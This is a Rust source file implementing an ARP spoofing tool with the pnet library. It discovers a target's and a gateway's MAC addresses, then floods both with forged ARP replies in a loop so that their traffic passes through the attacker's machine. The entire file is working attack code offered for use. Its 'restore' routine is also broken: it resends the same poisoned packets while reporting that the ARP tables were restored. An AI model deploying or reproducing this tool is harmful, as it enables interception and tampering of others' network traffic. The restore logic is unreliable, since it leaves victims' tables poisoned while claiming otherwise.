use pnet::datalink::{self, Channel, NetworkInterface};
use pnet::packet::arp::{ArpHardwareTypes, ArpOperations, ArpPacket, MutableArpPacket};
use pnet::packet::ethernet::{EtherTypes, MutableEthernetPacket};
use pnet::packet::MutablePacket;
use pnet::util::MacAddr;
use std::net::{IpAddr, Ipv4Addr};
use std::time::{Duration, Instant};
use std::thread;

pub struct ArpSpoofer {
    pub interface: NetworkInterface,
    pub target_ip: Ipv4Addr,
    pub gateway_ip: Ipv4Addr,
    pub target_mac: Option<MacAddr>,
    pub gateway_mac: Option<MacAddr>,
    pub attacker_mac: MacAddr,
    pub attacker_ip: Ipv4Addr,
}

impl ArpSpoofer {
    pub fn new(interface_name: &str, target_ip: Ipv4Addr, gateway_ip: Ipv4Addr) -> Result<Self, String> {
        let interfaces = datalink::interfaces();
        let interface = interfaces
            .into_iter()
            .find(|iface| iface.name == interface_name)
            .ok_or_else(|| format!("Interface '{}' not found", interface_name))?;

        let attacker_mac = interface.mac
            .ok_or("No MAC address found for interface")?;
        
        let attacker_ip = interface.ips
            .iter()
            .find(|ip| ip.is_ipv4())
            .and_then(|ip| match ip.ip() {
                IpAddr::V4(ipv4) => Some(ipv4),
                _ => None,
            })
            .ok_or("No IPv4 address found for interface")?;

        Ok(ArpSpoofer {
            interface,
            target_ip,
            gateway_ip,
            target_mac: None,
            gateway_mac: None,
            attacker_mac,
            attacker_ip,
        })
    }

    fn create_channel(&self) -> Result<Box<dyn datalink::DataLinkSender>, String> {
        match datalink::channel(&self.interface, Default::default()) {
            Ok(Channel::Ethernet(tx, _)) => Ok(tx),
            Ok(_) => Err("Unknown channel type".to_string()),
            Err(e) => Err(format!("Error creating channel: {}", e)),
        }
    }

    pub fn discover(&mut self) -> Result<(), String> {
        println!("[*] Discovering MAC addresses...");
        
        println!("[*] Looking for target: {}", self.target_ip);
        self.target_mac = Some(self.get_mac_address(self.target_ip)
            .ok_or_else(|| format!("Could not find MAC for target IP: {}", self.target_ip))?);
        println!("[+] Target MAC: {}", self.target_mac.unwrap());

        println!("[*] Looking for gateway: {}", self.gateway_ip);
        self.gateway_mac = Some(self.get_mac_address(self.gateway_ip)
            .ok_or_else(|| format!("Could not find MAC for gateway IP: {}", self.gateway_ip))?);
        println!("[+] Gateway MAC: {}", self.gateway_mac.unwrap());

        Ok(())
    }

    fn get_mac_address(&self, ip: Ipv4Addr) -> Option<MacAddr> {
        let mut sender = self.create_channel().ok()?;
        
        let mut buffer = [0u8; 42];
        {
            let mut eth_packet = MutableEthernetPacket::new(&mut buffer).unwrap();
            eth_packet.set_destination(MacAddr::broadcast());
            eth_packet.set_source(self.attacker_mac);
            eth_packet.set_ethertype(EtherTypes::Arp);

            let mut arp_packet = MutableArpPacket::new(eth_packet.payload_mut()).unwrap();
            arp_packet.set_hardware_type(ArpHardwareTypes::Ethernet);
            arp_packet.set_protocol_type(EtherTypes::Ipv4);
            arp_packet.set_hw_addr_len(6);
            arp_packet.set_proto_addr_len(4);
            arp_packet.set_operation(ArpOperations::Request);
            arp_packet.set_sender_hw_addr(self.attacker_mac);
            arp_packet.set_sender_proto_addr(self.attacker_ip);
            arp_packet.set_target_hw_addr(MacAddr::zero());
            arp_packet.set_target_proto_addr(ip);
        }

        // send_to returns Option<Result<(), Error>>, so handle properly
        match sender.send_to(&buffer, None) {
            Some(Ok(())) => {}, // Successfully sent
            _ => return None,   // Failed to send
        }

        // Listen for ARP reply
        let mut receiver = match datalink::channel(&self.interface, Default::default()) {
            Ok(Channel::Ethernet(_, rx)) => rx,
            _ => return None,
        };

        let start = Instant::now();
        while start.elapsed() < Duration::from_secs(2) {
            if let Ok(packet) = receiver.next() {
                if packet.len() >= 42 {
                    if let Some(arp) = ArpPacket::new(&packet[14..]) {
                        if arp.get_sender_proto_addr() == ip 
                            && arp.get_operation() == ArpOperations::Reply 
                        {
                            return Some(arp.get_sender_hw_addr());
                        }
                    }
                }
            }
        }
        None
    }

    fn send_arp_poison(&self, target_ip: Ipv4Addr, target_mac: MacAddr, spoof_ip: Ipv4Addr) -> Result<(), String> {
        let mut sender = self.create_channel()?;
        
        let mut buffer = [0u8; 42];
        {
            let mut eth_packet = MutableEthernetPacket::new(&mut buffer).unwrap();
            eth_packet.set_destination(target_mac);
            eth_packet.set_source(self.attacker_mac);
            eth_packet.set_ethertype(EtherTypes::Arp);

            let mut arp_packet = MutableArpPacket::new(eth_packet.payload_mut()).unwrap();
            arp_packet.set_hardware_type(ArpHardwareTypes::Ethernet);
            arp_packet.set_protocol_type(EtherTypes::Ipv4);
            arp_packet.set_hw_addr_len(6);
            arp_packet.set_proto_addr_len(4);
            arp_packet.set_operation(ArpOperations::Reply);
            arp_packet.set_sender_hw_addr(self.attacker_mac);
            arp_packet.set_sender_proto_addr(spoof_ip);
            arp_packet.set_target_hw_addr(target_mac);
            arp_packet.set_target_proto_addr(target_ip);
        }

        // Handle Option<Result<>> properly
        match sender.send_to(&buffer, None) {
            Some(Ok(())) => Ok(()),
            Some(Err(e)) => Err(format!("Failed to send ARP packet: {}", e)),
            None => Err("Failed to send ARP packet: unknown error".to_string()),
        }
    }

    pub fn start_poisoning(&self) -> Result<(), String> {
        let target_mac = self.target_mac.ok_or("Target MAC not discovered")?;
        let gateway_mac = self.gateway_mac.ok_or("Gateway MAC not discovered")?;

        println!("[*] Starting ARP poisoning...");
        println!("[*] Target {} <-> Gateway {}", self.target_ip, self.gateway_ip);
        println!("[*] Press Ctrl+C to stop\n");

        let mut count = 0;
        loop {
            self.send_arp_poison(self.target_ip, target_mac, self.gateway_ip)?;
            self.send_arp_poison(self.gateway_ip, gateway_mac, self.target_ip)?;

            count += 1;
            if count % 10 == 0 {
                println!("[*] ARP poisoning active... ({} rounds sent)", count);
            }

            thread::sleep(Duration::from_secs(2));
        }
    }

    pub fn restore(&self) -> Result<(), String> {
        println!("\n[*] Restoring ARP tables...");
        
        if let (Some(target_mac), Some(gateway_mac)) = (self.target_mac, self.gateway_mac) {
            for _ in 0..5 {
                self.send_arp_poison(self.target_ip, target_mac, self.gateway_ip)?;
                thread::sleep(Duration::from_millis(100));
            }
            println!("[+] Restored target's ARP table");
            
            for _ in 0..5 {
                self.send_arp_poison(self.gateway_ip, gateway_mac, self.target_ip)?;
                thread::sleep(Duration::from_millis(100));
            }
            println!("[+] Restored gateway's ARP table");
        }
        
        Ok(())
    }
}

impl Drop for ArpSpoofer {
    fn drop(&mut self) {
        if let Err(e) = self.restore() {
            eprintln!("[!] Error restoring ARP tables: {}", e);
        }
    }
}